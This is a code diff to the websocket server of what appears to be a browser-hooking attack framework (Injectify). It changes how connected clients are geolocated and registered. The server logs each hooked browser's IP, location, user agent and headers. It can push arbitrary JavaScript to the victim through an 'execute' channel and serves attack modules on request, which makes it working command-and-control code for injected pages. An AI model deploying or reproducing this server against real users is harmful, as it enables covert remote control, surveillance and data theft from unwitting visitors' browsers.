@@ -13,6 +13,7 @@ const request = require('request')
 const {URL} = require('url')
 const chalk = require('chalk')
 const fs = require('fs')
+var geoip = require('geoip-lite')
 const {flag, code, name} = require('country-emoji')
 const twemoji = require('twemoji')
 const atob = require('atob')
@@ -1088,144 +1089,139 @@ MongoClient.connect(config.mongodb, function (err, db) {
     }
     checkIfValid(socket).then(data => {
       let { debug, project } = data
+      // Create an array with the project's document ID (could use project name instead of ID)
+      if (!inject.clients[project.id]) inject.clients[project.id] = []
+      let inDebug = socket.url.charAt(19) == "$"
+      let country = 'https://twemoji.maxcdn.com/2/svg/2753.svg'
+      let ip
+      try {
+        ip = {
+          query: socket.headers['x-forwarded-for'].split(',')[0]
+        }
+      } catch (e) {
+        ip = {
+          query: getIP(socket.remoteAddress)
+        }
+      }
       if (config.debug) {
         console.log(
           chalk.greenBright('[inject] ') +
           chalk.yellowBright('new websocket connection for project ') +
-          chalk.magentaBright(project.name)
+          chalk.magentaBright(project.name) +
+          chalk.yellowBright('from ') +
+          chalk.magentaBright(ip.query)
         )
       }
-      // Create an array with the project's document ID (could use project name instead of ID)
-      if (!inject.clients[project.id]) inject.clients[project.id] = []
-      let inDebug = false
-      let ip
-      if (socket.url.charAt(19) == "$") inDebug = true
-      try {
-        ip = socket.headers['x-forwarded-for'].split(',')[0]
-      } catch (e) {
-        ip = getIP(socket.remoteAddress)
+      let parsedIP = geoip.lookup(ip)
+      if (parsedIP) {
+        parsedIP.query = ip.query
+        ip = parsedIP
+        country = 'https://twemoji.maxcdn.com/2/svg/' + twemoji.convert.toCodePoint(flag(ip.country)) + '.svg'
       }
-      request({
-        url: 'http://ip-api.com/json/' + ip,
-        method: 'GET',
-        headers: {
-          'Accept': 'application/json'
+      var agent = parseAgent(socket.headers['user-agent'])
+      var browser = '/assets/svg/default.svg'
+      if (socket.headers['user-agent'].includes('SamsungBrowser')) {
+        browser = '/assets/svg/samsung.svg'
+      } else if (socket.headers['user-agent'].includes('Edge')) {
+        browser = '/assets/svg/edge.svg'
+      } else if (socket.headers['user-agent'].includes('Trident')) {
+        browser = '/assets/svg/ie.svg'
+      } else if (agent.browser.name) {
+        var browserName = agent.browser.name.toLowerCase()
+        if (browserName == 'chrome') {
+          browser = '/assets/svg/chrome.svg'
+        } else if (browserName == 'firefox') {
+          browser = '/assets/svg/firefox.svg'
+        } else if (browserName == 'safari') {
+          browser = '/assets/svg/safari.svg'
+        } else if (browserName == 'opera') {
+          browser = '/assets/svg/opera.svg'
+        } else if (browserName == 'ie') {
+          browser = '/assets/svg/ie.svg'
         }
-      }, (error, response, parsedIP) => {
-        try {
-          ip = JSON.parse(parsedIP)
-        } catch (e) {
-          error = true
+      }
+      inject.clients[project.id].push({
+        id: data.id,
+        debug: inDebug,
+        'user-agent': agent,
+        ip: ip,
+        images: {
+          country: country,
+          browser: browser
+        },
+        socket: {
+          headers: socket.headers,
+          id: socket.id,
+          remoteAddress: socket.remoteAddress,
+          remotePort: socket.remotePort,
+          url: socket.url
+        },
+        execute: script => {
+          send('execute', script)
         }
-        if (!error) {
-          var agent = parseAgent(socket.headers['user-agent'])
-          var browser = '/assets/svg/default.svg'
-          if (socket.headers['user-agent'].includes('SamsungBrowser')) {
-            browser = '/assets/svg/samsung.svg'
-          } else if (socket.headers['user-agent'].includes('Edge')) {
-            browser = '/assets/svg/edge.svg'
-          } else if (socket.headers['user-agent'].includes('Trident')) {
-            browser = '/assets/svg/ie.svg'
-          } else if (agent.browser.name) {
-            var browserName = agent.browser.name.toLowerCase()
-            if (browserName == 'chrome') {
-              browser = '/assets/svg/chrome.svg'
-            } else if (browserName == 'firefox') {
-              browser = '/assets/svg/firefox.svg'
-            } else if (browserName == 'safari') {
-              browser = '/assets/svg/safari.svg'
-            } else if (browserName == 'opera') {
-              browser = '/assets/svg/opera.svg'
-            } else if (browserName == 'ie') {
-              browser = '/assets/svg/ie.svg'
-            }
-          }
-          var country = 'https://twemoji.maxcdn.com/2/svg/2753.svg'
-          if (ip.country) country = 'https://twemoji.maxcdn.com/2/svg/' + twemoji.convert.toCodePoint(flag(ip.country)) + '.svg' 
+      })
+      if (debug) {
+        send('core', inject.debugCore)
+      } else {
+        send('core', inject.core)
+      }
+      send('execute', 'injectify.send("d")')
+
+      socket.on('data', rawData => {
+        try { rawData = JSON.parse(rawData); if (!rawData.t && !rawData.d) return } catch (e) { return }
+        let on = (topic, callback) => {
+          if (topic !== rawData.t) return
+          callback(rawData.d)
         }
-        inject.clients[project.id].push({
-          id: data.id,
-          debug: inDebug,
-          'user-agent': agent,
-          ip: ip,
-          images: {
-            country: country,
-            browser: browser
-          },
-          socket: {
-            headers: socket.headers,
-            id: socket.id,
-            remoteAddress: socket.remoteAddress,
-            remotePort: socket.remotePort,
-            url: socket.url
-          },
-          execute: script => {
-            send('execute', script)
-          }
+
+        on('e', data => { // error
+          send('error', data)
+          console.log(data)
         })
-        if (debug) {
-          send('core', inject.debugCore)
-        } else {
-          send('core', inject.core)
-        }
-        send('execute', 'injectify.send("d")')
-  
-        socket.on('data', rawData => {
-          try { rawData = JSON.parse(rawData); if (!rawData.t && !rawData.d) return } catch (e) { return }
-          let on = (topic, callback) => {
-            if (topic !== rawData.t) return
-            callback(rawData.d)
-          }
-  
-          on('e', data => { // error
-            send('error', data)
-            console.log(data)
-          })
-  
-          on('execute', data => { // execute
-            send('execute', data)
-          })
-  
-          on('module', data => { // load a module
-            if (!data.name) return
-            var js = inject.modules[data.name]
-            if (debug) js = inject.debugModules[data.name]
-            if (js) {
-              try {
-                if (data.params) js = 'var module={name:' + JSON.stringify(data.name) + ',params:' + JSON.stringify(data.params) + '};' + js
-                send('module:' + data.name, js)
-              } catch (error) {
-                send('module:' + data.name, false)
-              }
-            } else {
+
+        on('execute', data => { // execute
+          send('execute', data)
+        })
+
+        on('module', data => { // load a module
+          if (!data.name) return
+          var js = inject.modules[data.name]
+          if (debug) js = inject.debugModules[data.name]
+          if (js) {
+            try {
+              if (data.params) js = 'var module={name:' + JSON.stringify(data.name) + ',params:' + JSON.stringify(data.params) + '};' + js
+              send('module:' + data.name, js)
+            } catch (error) {
               send('module:' + data.name, false)
             }
-          })
-  
-          on('r', data => { // response
-            console.log(data)
-          })
-  
-          on('ping', pingTime => { // ping
-            let difference = +new Date() - pingTime
-            send('pong', difference)
-          })
-  
-          on('d', data => { // data
-            send('execute',
-              `/*injectify.listen('message', data => {
-                console.error(data)
-              })*/
-  
-              injectify.send('message', {
-                test: true
-              })
-              `)
-          })
+          } else {
+            send('module:' + data.name, false)
+          }
         })
-        socket.on('close', function () {
-          inject.clients[project.id] = inject.clients[project.id].filter(client => client.id !== data.id)
+
+        on('r', data => { // response
+          console.log(data)
         })
+
+        on('ping', pingTime => { // ping
+          let difference = +new Date() - pingTime
+          send('pong', difference)
+        })
+
+        on('d', data => { // data
+          send('execute',
+            `/*injectify.listen('message', data => {
+              console.error(data)
+            })*/
+
+            injectify.send('message', {
+              test: true
+            })
+            `)
+        })
+      })
+      socket.on('close', function () {
+        inject.clients[project.id] = inject.clients[project.id].filter(client => client.id !== data.id)
       })
     }).catch(error => {
       if (config.debug) {
